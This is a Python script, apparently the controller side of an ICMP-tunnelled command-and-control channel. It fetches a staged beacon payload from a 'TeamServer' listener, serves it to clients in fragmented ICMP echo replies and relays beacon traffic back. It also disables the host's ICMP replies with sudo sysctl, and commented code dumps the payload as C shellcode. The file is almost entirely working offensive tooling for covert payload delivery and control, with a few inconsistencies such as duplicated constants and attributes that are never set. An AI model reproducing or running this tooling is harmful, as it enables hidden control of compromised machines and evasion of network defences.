import socket
import struct
from scapy.all import sniff, send, IP, ICMP, Raw
import sys
import time
import subprocess
import math
# === Constants ===
ICMP_TAG = "RQ47"
PAYLOAD_MAX_SIZE = 512 * 1024
BUFFER_MAX_SIZE = 1024 * 1024
MAX_ICMP_CHUNK_SIZE = 1400
ICMP_PAYLOAD_SIZE = 1000 # MUST MATCH CLIENT VALUE

ICMP_TAG = "RQ47"
TAG_SIZE = len(ICMP_TAG)           # 4
ICMP_PAYLOAD_SIZE = 1000           # total payload length inside ICMP (including TAG)
MAX_DATA_PER_CHUNK = ICMP_PAYLOAD_SIZE - TAG_SIZE  # 996


class ICMP_C2_Handler:
    def __init__(self, ip: str, port: int):
        self.server_ip = ip
        self.server_port = port
        self.sock = None

    def socket_setup(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(10) # 5 sec timeout
        try:
            self.sock.connect((self.server_ip, self.server_port))
            print(f"[+] Connected to TeamServer at {self.server_ip}:{self.server_port}")
        except socket.timeout:
            print(f"[!] Socket timed out - is listener up at {self.server_ip}:{self.server_port}?")
            self.sock.close()
            exit()
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            self.sock.close()
            self.sock = None
            exit()


    def get_payload(self):
        '''
        Needs to be called right after connecting
        '''
        # apparently need to do setup right after connecting
        self.send_frame(b"arch=x86")
        self.send_frame(b"pipename=foobar")
        self.send_frame(b"block=100")
        self.send_frame(b"go")
        self.payload = self.recv_frame()

    def recv_frame(self):
        raw_size = self.sock.recv(4)
        print(f"Frame coming from TeamServer: {raw_size}")
        if len(raw_size) < 4:
            raise ConnectionError("Failed to receive frame size.")
        size = struct.unpack('<I', raw_size)[0]

        buffer = b''
        while len(buffer) < size:
            chunk = self.sock.recv(size - len(buffer))
            if not chunk:
                raise ConnectionError("Socket closed before full frame received.")
            buffer += chunk

        return buffer

    def send_frame(self, data: bytes):
        print(f"Frame going to TeamServer: {data}")
        size = len(data)
        self.sock.sendall(struct.pack('<I', size))
        self.sock.sendall(data)

    # def handle_icmp(self, packet):
    #     try:
    #         if not (packet.haslayer(ICMP) and packet[ICMP].type == 8 and packet.haslayer(Raw)):
    #             return

    #         raw_load = packet[Raw].load
    #         if not raw_load.startswith(ICMP_TAG.encode()):
    #             return

    #         ip_src   = packet[IP].src
    #         ip_dst   = packet[IP].dst
    #         icmp_id  = getattr(packet[ICMP], "id", 1) & 0xFFFF
    #         icmp_seq = getattr(packet[ICMP], "seq", 1) & 0xFFFF

    #         payload_after_tag = raw_load[len(ICMP_TAG):]

    #         # init packet check for sending payload
    #         if icmp_seq == 0:
    #             # Client’s size request; immediately reply with fragmented C2 payload
    #             total_size = int.from_bytes(payload_after_tag[:4], "big")
    #             print(f"[+] Client requested payload of {total_size} bytes")
    #             # send payload back to client
    #             self.send_fragmented_icmp(
    #                 client_ip=ip_src,
    #                 client_icmp_id=icmp_id,
    #                 full_payload=self.payload
    #             )
    #             return

    #         # if icmp_seq not 0, then send data to teamserver
    #         # seq > 0: forward to TeamServer as before…
    #         print(f"[+] Forwarding data‐frame (seq {icmp_seq}) to TeamServer…")
    #         # NEED TO STRIP the \x00 here, otherwise team server breaks (encryption things & length)
    #         #print(f"Payload: {payload_after_tag.rstrip(b"\x00")}")
    #         self.send_frame(payload_after_tag.rstrip(b"\x00"))
    #         teamserver_response = self.recv_frame()

    #         data_from_teamserver = ICMP_TAG.encode() + teamserver_response
    #         print(f"TeamServer Says: {data_from_teamserver}")
    #         print("[+] Sending simple ICMP‐reply with TeamServer’s response…")
    #         reply = (
    #             IP(dst=ip_src, src=ip_dst) /
    #             ICMP(type=0, id=icmp_id, seq=icmp_seq) /
    #             Raw(load=data_from_teamserver)
    #         )
    #         send(reply, verbose=False)
    #         print(f"[+] Replied to {ip_src} with TeamServer’s data")
    #     except Exception as e:

    #         print(f"Error with handling ICMP: {e}")
    #         # beacon will crash/comms layer will fail as it's stuck waiting on a message then.

    #         # doesn't work
    #         # reply = (
    #         #     IP(dst=ip_src, src=ip_dst) /
    #         #     ICMP(type=0, id=icmp_id, seq=icmp_seq) /
    #         #     Raw(load=b"RQ47") # send nothing to maintian?
    #         # )
    #         # send(reply, verbose=False)

    # called on each ICMP packet
    def handle_icmp(self, packet):
        try:
            # 1) Only consider ICMP Echo Requests with a Raw payload
            if not (packet.haslayer(ICMP) and packet[ICMP].type == 8 and packet.haslayer(Raw)):
                return

            raw_load = packet[Raw].load
            # 2) Discard anything not prefixed by our TAG
            if not raw_load.startswith(ICMP_TAG.encode()):
                return

            ip_src   = packet[IP].src
            icmp_id  = packet[ICMP].id & 0xFFFF
            icmp_seq = packet[ICMP].seq & 0xFFFF

            # 3) When we see seq=0, that signals “start of a new transfer”
            if icmp_seq == 0:
                # ─── A) Reassemble all inbound fragments from this client_ip / icmp_id ───
                full_data = self._reassemble_all(ip_src, icmp_id)

                # ─── B) Depending on whether this is the first transfer, decide what to send back ───
                if self.first_transfer:
                    # First time: client is asking for the beacon
                    to_client = self.beacon_payload
                    self.first_transfer = False
                    print(f"[+] Sending beacon payload ({len(to_client)} bytes) to {ip_src}")
                else:
                    # Subsequent times: forward full_data to TeamServer, then reply
                    print(f"[+] Forwarding {len(full_data)} bytes to TeamServer")
                    self.send_frame(full_data)
                    ts_resp = self.recv_frame()
                    to_client = ts_resp
                    print(f"[+] Sending TeamServer response ({len(to_client)} bytes) back to {ip_src}")

                # ─── C) Finally, fragment `to_client` back to the client over ICMP ───
                self.send_fragmented_icmp(
                    client_ip=ip_src,
                    client_icmp_id=icmp_id,
                    full_payload=to_client
                )
                return

            # (Any icmp_seq > 0 is just part of that transfer, so we do not handle it here.)
        except Exception as e:
            print(f"Error in handle_icmp: {e}")

    def _reassemble_all(self, client_ip, client_icmp_id, timeout=5.0) -> bytes:
        """
        1) Wait for exactly one ICMP Echo Request with seq=0 from (client_ip, client_icmp_id).
        2) Read its TAG + 4-byte big-endian length + any data in that same packet.
        3) Compute how many more seq>0 chunks to expect, then loop to collect them.
        4) Return the assembled `bytes` of length == total_size.
        """
        # ─── a) Grab the seq=0 packet ───
        def _is_seq0(pkt):
            return (
                pkt.haslayer(ICMP)
                and pkt[ICMP].type == 8
                and pkt[ICMP].id == client_icmp_id
                and pkt[ICMP].seq == 0
                and pkt.haslayer(Raw)
                and pkt[IP].src == client_ip
                and pkt[Raw].load.startswith(ICMP_TAG)
            )

        pkt0_list = sniff(
            filter=f"icmp and src host {client_ip}",
            lfilter=_is_seq0,
            count=1,
            timeout=timeout
        )
        if not pkt0_list:
            raise TimeoutError("Timeout waiting for seq=0")

        pkt0 = pkt0_list[0]
        raw0 = pkt0[Raw].load
        total_size = int.from_bytes(raw0[TAG_SIZE:TAG_SIZE+4], "big")
        if total_size < 0:
            raise ValueError(f"Invalid length={total_size} in seq=0")

        first_data = raw0[TAG_SIZE+4:]
        first_len = min(len(first_data), total_size)

        # ─── b) How many more chunks?
        remaining = total_size - first_len
        if remaining < 0:
            remaining = 0
        more = math.ceil(remaining / MAX_DATA_PER_CHUNK)
        total_chunks = 1 + more

        # ─── c) Allocate buffer and copy any data from seq=0 ───
        buf = bytearray(total_size)
        if first_len:
            buf[0:first_len] = first_data[:first_len]

        # ─── d) Loop to collect seq=1..more ───
        for seq in range(1, more + 1):
            def _is_follow(pkt):
                return (
                    pkt.haslayer(ICMP)
                    and pkt[ICMP].type == 8
                    and pkt[ICMP].id == client_icmp_id
                    and pkt[ICMP].seq == seq
                    and pkt.haslayer(Raw)
                    and pkt[IP].src == client_ip
                    and pkt[Raw].load.startswith(ICMP_TAG)
                )
            pkt_list = sniff(
                filter=f"icmp and src host {client_ip}",
                lfilter=_is_follow,
                count=1,
                timeout=timeout
            )
            if not pkt_list:
                raise TimeoutError(f"Timeout waiting for chunk seq={seq}")
            chunk = pkt_list[0][Raw].load[TAG_SIZE:]
            offset = (seq - 1) * MAX_DATA_PER_CHUNK
            length = min(len(chunk), total_size - offset)
            buf[offset:offset+length] = chunk[:length]

        return bytes(buf)


    # for large frames/payloads
    def send_icmp_packet(self, ip_dst, icmp_id, icmp_seq, payload, tag=b"RQ47"):
        """
        Always send as an Echo Reply (type 0).
        """
        full_payload = tag + payload
        packet = IP(dst=ip_dst) / ICMP(type=0, id=icmp_id, seq=icmp_seq) / Raw(load=full_payload)
        send(packet, verbose=False)
        print(f"[+] Sent ICMP REPLY seq={icmp_seq}, len={len(full_payload)}")

    def wait_for_echo_request(self, expected_src_ip, expected_icmp_id=None):
        """
        Block until we see an ICMP Echo Request (type=8) from expected_src_ip.
        If expected_icmp_id is provided, also match on ICMP.id.
        Returns the full Scapy packet.
        """
        # Build a filter function that checks for:
        #   - IP.src == expected_src_ip
        #   - ICMP.type == 8 (Echo Request)
        #   - optionally ICMP.id == expected_icmp_id
        def _pkt_filter(pkt):
            if IP not in pkt or ICMP not in pkt:
                return False
            if pkt[IP].src != expected_src_ip:
                return False
            if pkt[ICMP].type != 8:  # 8 == Echo Request
                return False
            if expected_icmp_id is not None and pkt[ICMP].id != expected_icmp_id:
                return False
            return True

        # This will block until one packet arrives that passes _pkt_filter
        found = sniff(lfilter=_pkt_filter, count=1, timeout=None)
        if not found:
            return None
        return found[0]  # first (and only) packet



    def send_fragmented_icmp(self, client_ip, client_icmp_id, full_payload, tag=b"RQ47"):
        """
        Fragment `full_payload` into (ICMP_PAYLOAD_SIZE - TAG_SIZE) bytes each,
        and send immediately (no extra wait). The first reply is seq=0 (size),
        then seq=1..N data chunks.
        """
        # 1) Send seq=0 reply with total-size (4 bytes)
        total_size = len(full_payload)
        size_bytes = total_size.to_bytes(4, "big")

        print(f"[*] Sending seq=0 reply to {client_ip} (ID={client_icmp_id}). Total payload={total_size} bytes")
        self.send_icmp_packet(
            ip_dst=client_ip,
            icmp_id=client_icmp_id,
            icmp_seq=0,
            payload=size_bytes,
            tag=tag
        )

        # 2) Send actual data in (ICMP_PAYLOAD_SIZE - TAG_SIZE) byte chunks
        CHUNK_DATA_SIZE = ICMP_PAYLOAD_SIZE - len(tag)  # e.g. 500 - 4 = 496

        offset = 0
        seq = 1
        while offset < len(full_payload):
            chunk = full_payload[offset : offset + CHUNK_DATA_SIZE]
            print(f"    → Sending data chunk seq={seq}, data_bytes={len(chunk)}")
            self.send_icmp_packet(
                ip_dst=client_ip,
                icmp_id=client_icmp_id,
                icmp_seq=seq,
                payload=chunk,
                tag=tag
            )
            offset += CHUNK_DATA_SIZE
            seq += 1
            time.sleep(.1)
    # def go(self):
    #     print(f"[+] Attempting to connect to TeamServer External C2 Listener at: {self.server_ip}:{self.server_port}")
    #     self.socket_setup()
    #     if not self.sock:
    #         return

    #     print("[+] Getting payload from TeamServer")
    #     self.get_payload()

    #     print("[+] Starting ICMP Listener...")
    #     sniff(filter="icmp", prn=self.handle_icmp, store=0)


    def go(self):
        print(f"[+] Connecting to TeamServer at {self.server_ip}:{self.server_port}")
        self.socket_setup()
        if not self.sock:
            return

        print("[+] Fetching initial payload from TeamServer...")
        self.get_payload()

        print("[+] Starting ICMP listener...")
        sniff(filter="icmp", prn=self.handle_icmp, store=0)

def disable_echo_response():
    print("=" * 50 )
    try:
        print("[+] Disabling ICMP echo replies from the system. This script will handle them instead")

        result = subprocess.run(
            ['sudo', 'sysctl', '-w', 'net.ipv4.icmp_echo_ignore_all=1'],
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        print("Output:", result.stdout)
    except subprocess.CalledProcessError as e:
        print("Could not disable ICMP Echo replies - ICMP listener may not receive all messages:", e.stderr)

    print("=" * 50 )

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("[!] Required arguments: Host, Port. Ex: `python3 controller.py 127.0.0.1 2222`")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])

    disable_echo_response()
    c2 = ICMP_C2_Handler(ip=host, port=port)
    c2.go()
    #print(c2.payload)

    # raw = c2.payload  # bytes object

    # # Build a comma-separated 0xNN list, 16 bytes per line for readability
    # lines = []
    # for i in range(0, len(raw), 16):
    #     chunk = raw[i:i+16]
    #     hex_bytes = ", ".join(f"0x{b:02x}" for b in chunk)
    #     lines.append("    " + hex_bytes)

    # array_body = ",\n".join(lines)

    # shellcode_c  = "unsigned char shellcode[] = {\n"
    # shellcode_c += array_body
    # shellcode_c += "\n};\n"
    # shellcode_c += f"unsigned int shellcode_len = {len(raw)};\n"

    # with open("payload_shellcode.h", "w") as f:
    #     f.write(shellcode_c)

    # print(f"[+] Wrote payload_shellcode.h ({len(raw)} bytes of shellcode)") 